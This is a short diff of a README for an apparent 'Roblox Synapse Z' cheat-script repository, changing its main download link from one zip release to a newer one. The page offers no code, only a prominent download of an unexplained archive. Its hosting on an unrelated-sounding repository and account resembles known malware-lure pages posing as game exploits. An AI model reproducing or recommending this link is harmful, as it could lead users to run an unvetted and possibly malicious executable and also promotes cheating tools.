@@ -1,7 +1,7 @@
 # Roblox Synapse Z
 Welcome to the Roblox Synapse Z repository! 🎮 Here, you'll find a variety of scripts and tools designed to enhance your Roblox experience using Synapse and Lua.
 
-# [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/UpdateV2.0.zip)
+# [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/UpdateV2.1.zip)
 
 ![image](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/photo_2024-12-10_22-09-27.jpg)
 
